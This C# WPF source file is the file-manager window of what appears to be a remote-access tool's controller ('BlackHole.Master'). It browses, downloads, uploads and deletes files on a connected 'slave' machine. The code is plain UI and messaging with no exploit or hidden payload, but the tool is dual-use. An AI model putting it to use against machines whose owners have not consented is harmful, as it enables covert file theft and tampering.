using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Model;
using BlackHole.Master.Remote;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class FileManager
    {
        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<FileMeta> ViewModelFiles
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        private long m_sucessfulTransactions, m_totalTransactions;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public FileManager(Slave slave) : base(slave)
        {
            InitializeComponent();

            Loaded += OnNavigate;

            TargetStatusBar.DataContext = slave;
            FileTransactionsList.DataContext = ViewModelCommands;
            FilesList.DataContext = ViewModelFiles = new ViewModelCollection<FileMeta>(this);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="name"></param>
        private string GetFilePath(string name) => Path.Combine(TxtBoxDirectory.Text, name);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnDeleteFile(object sender, RoutedEventArgs e) => DeleteSelectedFiles();

        /// <summary>
        /// 
        /// </summary>
        private void DeleteSelectedFiles() =>
            ExecuteOnSelectedItems<FileMeta>(FilesList, (meta) =>
            {
                if (meta.Type == FileType.FILE)
                    DeleteFile(meta.Name);
            });

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnNavigate(object sender, RoutedEventArgs e) => NavigateToTypedFolder();

        /// <summary>
        /// 
        /// </summary>
        private void NavigateToTypedFolder() => NavigateToFolder(TxtBoxDirectory.Text);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnUpload(object sender, RoutedEventArgs e) => UploadTypedFile();

        /// <summary>
        /// 
        /// </summary>
        private void UploadTypedFile() => UploadFile(TxtBoxUpload.Text);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnFolderDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var file = ((ListViewItem)sender).Content as FileMeta;
            if (file.Type == FileType.FOLDER)
                NavigateToFolder(file.Name);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnDownloadFile(object sender, RoutedEventArgs e) => DownloadSelectedFiles();

        /// <summary>
        /// 
        /// </summary>
        private void DownloadSelectedFiles() => 
            ExecuteOnSelectedItems<FileMeta>(FilesList, (meta) =>
            {
                if (meta.Type == FileType.FILE)
                    DownloadFile(meta.Name);
            });

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnCancelTransaction(object sender, RoutedEventArgs e) => CancelSelectedTransactions();

        /// <summary>
        /// 
        /// </summary>
        private void CancelSelectedTransactions() =>
            ExecuteOnSelectedItems<IRemoteCommand>(FileTransactionsList, (transaction) => CancelCommand(transaction.Id));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="folder"></param>
        private void NavigateToFolder(string folder) =>
            this.Send(new NavigateToFolderMessage()
            {
                Path = Path.Combine(TxtBoxDirectory.Text, folder)
            });      
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="name"></param>
        private void DeleteFile(string name)
        {
            var filePath = GetFilePath(name);
            this.Send(new DeleteFileMessage()
            {
                FilePath = filePath
            });
        }  
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="uri"></param>
        private void UploadFile(string uri)
        {
            var fileName = Path.GetFileName(uri);
            AddCommand(CommandFactory.CreateCommand<UploadProgressMessage>(
                CommandType.UPLOAD,
                Slave,
                fileName,
                (command) =>
                {
                    this.Send(new UploadFileMessage()
                    {
                        Id = command.Id,
                        Path = GetFilePath(fileName),
                        Uri = uri,
                    });
                },
                (progress) =>
                {
                    // nothing to do on continue
                },
                (progress) =>
                {
                    Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_UPLOADED, Slave, fileName));
                    FinishCurrentCommand();
                    NavigateToTypedFolder();
                },
                () =>
                {
                    FinishCurrentCommand();
                }));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        private void DownloadFile(string name)
        {
            var filePath = GetFilePath(name);

            AddCommand(CommandFactory.CreateCommand<DownloadedFilePartMessage>(
                CommandType.DOWNLOAD,
                Slave,
                name,

                (command) => // execute
                {
                    this.Send(new DownloadFilePartMessage()
                    {
                        Id = command.Id,
                        CurrentPart = 0,
                        Path = filePath
                    });
                },
                (download) => // continue
                {
                    FileHelper.WriteDownloadedPart(Slave.OutputDirectory, download.Path, download.CurrentPart, download.RawPart);
                    this.Send(new DownloadFilePartMessage()
                    {
                        Id = download.Id,
                        Path = download.Path,
                        CurrentPart = download.CurrentPart + 1
                    });
                },
                (download) => // complete
                {
                    TotalTransaction.Content = $"Successful transactions: {++m_sucessfulTransactions}/{m_totalTransactions}";
                    FileHelper.WriteDownloadedPart(Slave.OutputDirectory, download.Path, download.CurrentPart, download.RawPart);
                    Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_DOWNLOADED, Slave, Path.GetFileName(download.Path)));
                    FinishCurrentCommand();
                },
                () => // fault
                {
                    FinishCurrentCommand();
                }));

            m_totalTransactions++;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public override async Task OnEvent(SlaveEvent ev)
        {
            await base.OnEvent(ev);
            await this.ExecuteInDispatcher(() =>
            {
                switch((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.INCOMMING_MESSAGE:
                        ev.Data
                            .Match()
                            .With<FolderNavigationMessage>(m =>
                            {
                                TxtBoxDirectory.Text = m.Path;
                                ViewModelFiles.Items.Clear();
                                m.Files.ForEach(ViewModelFiles.Items.Add);
                            })
                            .With<StatusUpdateMessage>(m =>
                            {
                                TargetStatus.Content = m.Operation;
                                TargetStatusTooltipTitle.Text = m.Operation;
                                TargetStatusTooltipMessage.Text = m.Message;
                                TargetStatus.Foreground = m.Success ? Brushes.DarkGreen : Brushes.Red;
                                TargetStatusTooltip.PlacementTarget = TargetStatus;
                                TargetStatusTooltip.IsOpen = true;
                            })
                            .With<DownloadedFilePartMessage>(m =>
                            {
                                UpdateCommand(m,
                                    (command) =>
                                    {
                                        command.Completed = m.CurrentPart >= m.TotalPart;
                                        command.UpdateProgression(m.CurrentPart + 1, m.TotalPart);
                                    });
                            })
                            .With<UploadProgressMessage>(m =>
                            {
                                // will be received when the slave downloaded the file
                                UpdateCommand(m,
                                    (command) =>
                                    {
                                        command.Completed = m.Percentage == -1;
                                        if (!command.Completed)
                                            command.UpdateProgression(m.Percentage, 100);
                                    });
                            })
                            .With<FileDeletionMessage>(m =>
                            {
                                NavigateToTypedFolder();
                            });                        
                        break;
                }
            });
        }     
    }
}
